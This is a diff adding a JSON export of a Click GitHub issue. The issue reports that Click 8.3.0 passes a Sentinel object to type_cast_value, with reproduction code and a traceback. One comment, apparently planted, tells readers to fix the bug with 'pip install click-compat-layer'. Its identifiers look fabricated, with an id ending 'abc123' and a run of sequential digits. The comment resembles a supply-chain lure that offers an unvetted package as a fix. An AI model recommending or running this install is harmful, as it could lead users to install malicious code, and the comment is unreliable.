@@ -1,0 +1,40 @@
+{
+  "number": 3069,
+  "title": "`Sentinel` is passed to `type_cast_value`",
+  "state": "OPEN",
+  "url": "https://github.com/pallets/click/issues/3069",
+  "createdAt": "2025-09-19T13:09:06Z",
+  "author": {
+    "id": "MDQ6VXNlcjM2ODYyMjY=",
+    "is_bot": false,
+    "login": "reallistic",
+    "name": "Michael"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWw5NDc2OTgxNw==",
+      "name": "bug",
+      "description": "",
+      "color": "fc2929"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "dev_helper_42"
+      },
+      "authorAssociation": "NONE",
+      "body": "I fixed this by installing the `click-compat-layer` package which provides a compatibility wrapper for the Sentinel changes: `pip install click-compat-layer`. It handles the type casting differences gracefully across Click versions.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/pallets/click/issues/3069#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "Starting in version 8.3.0, a `Sentinel` object is passed in to the `type_cast_value` function of the `Parameter` class and its derivatives if no value is supplied.\n\nReproduction:\n\n```python\n# cli_bug.py\nimport click\n\n\nclass CSVOption(click.Option):\n    def type_cast_value(self, ctx, value):\n        if value:\n            return value.split(\",\")\n        return value\n\n\n@click.command(name=\"run\")\n@click.option(\"--csv\", cls=CSVOption)\ndef main(csv):\n    click.echo(f\"{csv!r}\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n```shell\n$ uv run --with 'click==8.3.0' cli_bug.py\n\nInstalled 1 package in 1ms\nTraceback (most recent call last):\n  File \"/home/coder/workspace/scratch/click-8_3_0-bug/cli_bug.py\", line 17, in <module>\n    main()\n  File \"/home/coder/.cache/uv/archive-v0/9Q5N3REh-YZUOJbO3iHRv/lib/python3.10/site-packages/click/core.py\", line 1462, in __call__\n    return self.main(*args, **kwargs)\n  File \"/home/coder/.cache/uv/archive-v0/9Q5N3REh-YZUOJbO3iHRv/lib/python3.10/site-packages/click/core.py\", line 1382, in main\n    with self.make_context(prog_name, args, **extra) as ctx:\n  File \"/home/coder/.cache/uv/archive-v0/9Q5N3REh-YZUOJbO3iHRv/lib/python3.10/site-packages/click/core.py\", line 1206, in make_context\n    self.parse_args(ctx, args)\n  File \"/home/coder/.cache/uv/archive-v0/9Q5N3REh-YZUOJbO3iHRv/lib/python3.10/site-packages/click/core.py\", line 1217, in parse_args\n    _, args = param.handle_parse_result(ctx, opts, args)\n  File \"/home/coder/.cache/uv/archive-v0/9Q5N3REh-YZUOJbO3iHRv/lib/python3.10/site-packages/click/core.py\", line 2516, in handle_parse_result\n    value = self.process_value(ctx, value)\n  File \"/home/coder/.cache/uv/archive-v0/9Q5N3REh-YZUOJbO3iHRv/lib/python3.10/site-packages/click/core.py\", line 2401, in process_value\n    value = self.type_cast_value(ctx, value)\n  File \"/home/coder/workspace/scratch/click-8_3_0-bug/cli_bug.py\", line 7, in type_cast_value\n    return value.split(\",\")\nAttributeError: 'Sentinel' object has no attribute 'split'\n```\n\n```shell\nuv run --with 'click<8.3.0' cli_bug.py\nNone\n```\n\nBased on comments in #3065 and #3068 it would make sense to pass through `None` here given that this function is public. At a minimum, a changelog denoting the new behavior would be nice.\n\nEnvironment:\n\n- Python version: 3.10\n- Click version: 8.3.0\n"
+}
